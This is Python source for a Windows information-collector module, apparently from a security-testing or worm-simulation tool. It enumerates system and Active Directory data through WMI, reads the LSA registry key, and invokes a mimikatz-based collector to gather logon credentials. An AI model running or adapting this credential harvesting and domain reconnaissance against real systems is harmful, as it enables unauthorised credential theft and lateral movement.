import os
import logging

import sys
sys.coinit_flags = 0 # needed for proper destruction of the wmi python module
import wmi
import win32com
import _winreg

from mimikatz_collector import MimikatzCollector
from . import InfoCollector

LOG = logging.getLogger(__name__)
LOG.info('started windows info collector')

__author__ = 'uri'

WMI_CLASSES = {"Win32_OperatingSystem", "Win32_ComputerSystem", "Win32_LoggedOnUser", "Win32_UserAccount",
               "Win32_UserProfile", "Win32_Group", "Win32_GroupUser", "Win32_Product", "Win32_Service",
               "Win32_OptionalFeature"}

# These wmi queries are able to return data about all the users & machines in the domain.
# For these queries to work, the monkey shohuld be run on a domain machine and
#
#     monkey should run as *** SYSTEM *** !!!
#
WMI_LDAP_CLASSES = {"ds_user": ("DS_sAMAccountName", "DS_userPrincipalName",
                                "DS_sAMAccountType", "ADSIPath", "DS_userAccountControl",
                                "DS_objectSid", "DS_objectClass", "DS_memberOf",
                                "DS_primaryGroupID", "DS_pwdLastSet", "DS_badPasswordTime",
                                "DS_badPwdCount", "DS_lastLogon", "DS_lastLogonTimestamp",
                                "DS_lastLogoff", "DS_logonCount", "DS_accountExpires"),
                                
                    "ds_group": ("DS_whenChanged", "DS_whenCreated", "DS_sAMAccountName",
                                 "DS_sAMAccountType", "DS_objectSid", "DS_objectClass",
                                 "DS_name", "DS_memberOf", "DS_member", "DS_instanceType",
                                 "DS_cn", "DS_description", "DS_distinguishedName", "ADSIPath"),
                                 
                    "ds_computer": ("DS_dNSHostName", "ADSIPath", "DS_accountExpires",
                                    "DS_adminDisplayName", "DS_badPasswordTime",
                                    "DS_badPwdCount", "DS_cn", "DS_distinguishedName",
                                    "DS_instanceType", "DS_lastLogoff", "DS_lastLogon",
                                    "DS_lastLogonTimestamp", "DS_logonCount", "DS_objectClass",
                                    "DS_objectSid", "DS_operatingSystem", "DS_operatingSystemVersion",
                                    "DS_primaryGroupID", "DS_pwdLastSet", "DS_sAMAccountName",
                                    "DS_sAMAccountType", "DS_servicePrincipalName", "DS_userAccountControl",
                                    "DS_whenChanged", "DS_whenCreated"),
                    }


def fix_obj_for_mongo(o):
    if type(o) == dict:
        return dict([(k, fix_obj_for_mongo(v)) for k, v in o.iteritems()])
        
    elif type(o) in (list, tuple):
        return [fix_obj_for_mongo(i) for i in o]
        
    elif type(o) in (int, float, bool):
        return o
        
    elif type(o) in (str, unicode):
        # mongo dosn't like unprintable chars, so we use repr :/
        return repr(o)
        
    elif hasattr(o, "__class__") and o.__class__ == wmi._wmi_object:
        return fix_wmi_obj_for_mongo(o)
    
    elif hasattr(o, "__class__") and o.__class__ == win32com.client.CDispatch:
        try:
            # objectSid property of ds_user is problematic and need thie special treatment.
            # ISWbemObjectEx interface. Class Uint8Array ?
            if str(o._oleobj_.GetTypeInfo().GetTypeAttr().iid) == "{269AD56A-8A67-4129-BC8C-0506DCFE9880}":
                return o.Value
        except:
            pass
        
        try:
            return o.GetObjectText_()
        except:
            pass
        
        return repr(o)

    else: 
        return repr(o)

def fix_wmi_obj_for_mongo(o):
    row = {}

    for prop in o.properties:
        try:
            value = getattr(o, prop)
        except wmi.x_wmi:
            # This happens in Win32_GroupUser when the user is a domain user.
            # For some reason, the wmi query for PartComponent fails. This table
            # is actually contains references to Win32_UserAccount and Win32_Group.
            # so instead of reading the content to the Win32_UserAccount, we store
            # only the id of the row in that table, and get all the other information
            # from that table while analyzing the data.
            value = o.properties[prop].value

        row[prop] = fix_obj_for_mongo(value)

    for method_name in o.methods:
        if not method_name.startswith("GetOwner"):
            continue

        method = getattr(o, method_name)

        try:
            value = method()
            value = fix_obj_for_mongo(value)
            row[method_name[3:]] = value
            
        except wmi.x_wmi:
            continue

    return row


class WindowsInfoCollector(InfoCollector):
    """
    System information collecting module for Windows operating systems
    """

    def __init__(self):
        super(WindowsInfoCollector, self).__init__()
        self.info['reg'] = {}
        self._config = __import__('config').WormConfiguration

    def get_info(self):
        """
        Collect Windows system information
        Hostname, process list and network subnets
        Tries to read credential secrets using mimikatz
        :return: Dict of system information
        """
        LOG.debug("Running Windows collector")
        self.get_hostname()
        self.get_process_list()
        self.get_network_info()
        self.get_azure_info()
        
        self.get_wmi_info()
        LOG.debug('finished get_wmi_info')
        self.get_reg_key(r"SYSTEM\CurrentControlSet\Control\Lsa")
        self.get_installed_packages()
        
        mimikatz_collector = MimikatzCollector()
        mimikatz_info = mimikatz_collector.get_logon_info()
        if mimikatz_info:
            if "credentials" in self.info:
                self.info["credentials"].update(mimikatz_info)
            self.info["mimikatz"] = mimikatz_collector.get_mimikatz_text()

        return self.info

    def get_installed_packages(self):
        self.info["installed_packages"] = os.popen("dism /online /get-packages").read()
        self.info["installed_features"] = os.popen("dism /online /get-features").read()
        
    def get_wmi_info(self):
        for wmi_class_name in WMI_CLASSES:
            self.info[wmi_class_name] = self.get_wmi_class(wmi_class_name)

    def get_wmi_class(self, class_name, moniker="//./root/cimv2", properties=None):
        _wmi = wmi.WMI(moniker=moniker) 

        try:
            if not properties:
                wmi_class = getattr(_wmi, class_name)()
            else:
                wmi_class = getattr(_wmi, class_name)(properties)

        except wmi.x_wmi:
            return

        return fix_obj_for_mongo(wmi_class)

    def get_reg_key(self, subkey_path, store=_winreg.HKEY_LOCAL_MACHINE):
        key = _winreg.ConnectRegistry(None, store)
        subkey = _winreg.OpenKey(key, subkey_path)

        d = dict([_winreg.EnumValue(subkey, i)[:2] for i in xrange(_winreg.QueryInfoKey(subkey)[0])])
        d = fix_obj_for_mongo(d)

        self.info['reg'][subkey_path] = d

        subkey.Close()
        key.Close()
